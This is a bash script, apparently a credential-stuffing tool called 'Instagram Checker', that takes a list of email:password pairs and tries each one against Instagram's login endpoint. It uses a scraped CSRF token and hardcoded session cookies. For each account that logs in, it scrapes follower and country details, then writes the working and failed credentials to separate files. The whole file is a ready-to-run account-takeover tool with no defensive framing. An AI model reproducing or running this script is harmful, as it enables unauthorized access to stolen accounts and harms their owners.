#!/bin/bash
#Instagram Checker Issued 09:39 05/03/2019
#Made With Love By Demeter16
NC='\033[0m'
GREEN='\e[38;5;82m'
CYAN='\e[38;5;45m'
RED='\e[38;5;196m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'
header () {
printf "\n"
printf "     ${GREEN}_                     _            __    ____ \n"
printf "    | |                   | |          /  |  / ___|\n"
printf "  __| | ___ _ __ ${CYAN}___   ___| |_ ___ _ __\`| | / /___ \n"
printf " / _\` |/ _ \ ${YELLOW}'_ \` _ \ / _ \ __/ _ \ '__|| | | ___ \\\\\n"
printf "| (_| |  __/ | | | | |  __/ ||  ${RED}__/ |  _| |_| \_/ |\n"
printf " \__,_|\___|_| |_| ${BLUE}|_|\___|\__\___|_|  \___/\_____/\n"
printf "${NC}\n"
                                                   
                                                   

}
IGcheck() {
	footer="#SGBTEAM - IG CHECKER"
	ceklogin=$(curl -s 'https://www.instagram.com/accounts/login/ajax/' \
-H 'origin: https://www.instagram.com' \
-H 'accept-encoding: gzip, deflate, br' \
-H 'accept-language: en-US,en;q=0.9' \
-H 'x-requested-with: XMLHttpRequest' \
-H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' \
-H 'cookie: mcd=3; mid=W9lE6wALAAE8o8dXUdobBIUTRbaz; fbm_124024574287414=base_domain=.instagram.com; datr=w2YQXAf4ZbNMbCjCFyx44dmS; shbid=11979; shbts=1546747948.9399455; csrftoken='$tokentot'; ds_user_id=2136514677; rur=ASH; fbsr_124024574287414=8P2Q319aRq6ciFfdMkrYFIzmUvDxKwbZgLG0UX9Id50.eyJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImNvZGUiOiJBUUNEUXdrcjFKWllUbjBrUkktQTFRQnpqUWdBLTdEQlF3Z1pwelM5blJBMVY3VlcyRm9MZFNIbkM4bWo2aXR4X0VJRWZRUVVpanZmMzNxUlIwYTgwSG1BQjQyRWNoZGhvRkRXWlAycDd5YmdHWWVod1lPUEwyamdVbWh1cF9lcmNreW5GdFlUM3Y4X041cmoyN2ZUdFFjVktHdnpSVjBQS254N0xQV2FNTjJxdVdxR0dpUnhFOHFpS3g3ckZ4Z3hzcjZJWFJQdU00dGNRQjAta2VoUzBtdng2SEE2a1k1VXJBWlJ1aHlUX1dSZmdzNU85eEJ2d3N2ZEJJbEVkcnNpQmtaU0p4VHhVd2lIYnpmM2EzVWFxMTFTemJ5eUp0eG9NcXN5TjFxTzc4U2lxYUxQOWtSS2VXRmhOb2pIMTE4cHo5OVE2aDFRVDQ3ZUZIVTVrNWV0VV9tZCIsImlzc3VlZF9hdCI6MTU0NjkzNjgxMiwidXNlcl9pZCI6IjEwMDAwNjIxOTY5NTc5MSJ9; urlgen="{\"180.249.129.35\": 17974}:1ggmvk:wOP7pFF21pg-Z1pCWUgxYWcxmxE"' \
-H 'x-csrftoken: '$tokentot'' \
-H 'x-instagram-ajax: '$ajax'' \
-H 'content-type: application/x-www-form-urlencoded' \
-H 'accept: */*' \
-H 'referer: https://www.instagram.com/' \
-H 'authority: www.instagram.com' \
--data 'username='$1'&password='$2'&queryParams=%7B%7D' --compressed)
userid=$(echo "$ceklogin" | grep -Po "(?<=\"userId\": \").*?(?=\",)")
	getinfo=`curl -Ls -X GET \
--url 'http://instagram.com/web/friendships/'$userid'/follow/' \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-language: en-US,en;q=0.9,id;q=0.8" \
-H 'cookie: mid=XCzrcgALAAFE5rMhu0Fq_l7DfuPj; mcd=3; fbm_124024574287414=base_domain=.instagram.com; csrftoken='$tokentot'; ds_user_id='$userid'; sessionid=11392575584%3AIUXmoLAeICL1MO%3A2; rur=ATN; urlgen="{\"116.206.15.0\": 45727}:1h0zMO:SW777R-XvU3zilPNDUjCZV3S4iM"' \
-H "dnt: 1" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" --compressed`
	cox=$( echo "$ceklogin" | grep -Po '(?<=authenticated": )[^",]*' )
    getInfoNama=$( echo "$getinfo" | grep -Po '(?<=name":")[^"]*' | head -2 | tail -2)
    getFoll=$( echo "$getinfo" | grep -Po '(?<=userInteractionCount":")[^"]*')
    getCountry=$( echo "$getinfo" | grep -Po '(?<=country_code":")[^"]*')
    getUser=$( echo "$getinfo" | grep -Po "(?<=alternateName\":\"\@).*?(?=\",)")
    infoMail=$( echo "$getinfo" | grep -Po '(?<=alternateName":"@)[^"]*')
    getFollowing=$(echo "$getinfo" | grep -Po "(?<=Followers, ).*?(?=Following,)" | head -1)
    postingan=$(echo $getinfo | grep -Po "(?<=Following, ).*?(?=Posts)" | head -1)
	if [[ $cox == "true" ]]; then
		printf "${NC}[$i/$totalLines]${GREEN}[LIVE] => $1:$2\n"
    printf "${CYAN}Username : $getUser | Follower : $getFoll | Following : $getFollowing | Post : $postingan | Country : $getCountry \n ${NC}"
    echo "$1|$2" >> iglive.txt
	else
    echo "$1|$2" >> igdie.txt
	    printf "${NC}[$i/$totalLines]${RED}[DIE] => $1:$2${NC} \n"
	fi
printf "\r"
}
ngetoken() {
  wait
	resp=`curl 'https://www.instagram.com/accounts/login/ajax/' \
-H 'origin: https://www.instagram.com' \
-H 'accept-encoding: gzip, deflate, br' \
-H 'accept-language: en-US,en;q=0.9' \
-H 'x-requested-with: XMLHttpRequest' \
-H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' --compressed -D - -s -o /dev/null`
	tokentot="$(echo "$resp" | grep -Po '(?<=csrftoken=)[^;]*')"
	ajax="16b73267f71b"
	# echo $resp
	# echo "ini cok : $tokentot"
  if [[ $tokentot == '' ]]; then
    sleep 4
    echo "[x] Ohh SNAP!!!. Regenerate token now. Please wait..."
    ngetoken
    sleep 2
  fi
}
echo ""
echo "List In This Directory : "
printf "${YELLOW}"
echo '==================================='
ls
echo '==================================='
printf "${BLUE}"
echo "Delimeter list -> email:password "
printf "${NC}"
echo -n "Your Mail:Pass List : "
read list
    header
    echo "You Have $(grep -c ':' $list) List"
    if [ ! -f $list ]; then
echo "$list No Such File"
    exit
    fi
    ngetoken
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
    for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
        emailna="${emailgblg[$i]}"
        passwordnaa="${passwordna[$i]}"

        IGcheck $emailna $passwordnaa
    done
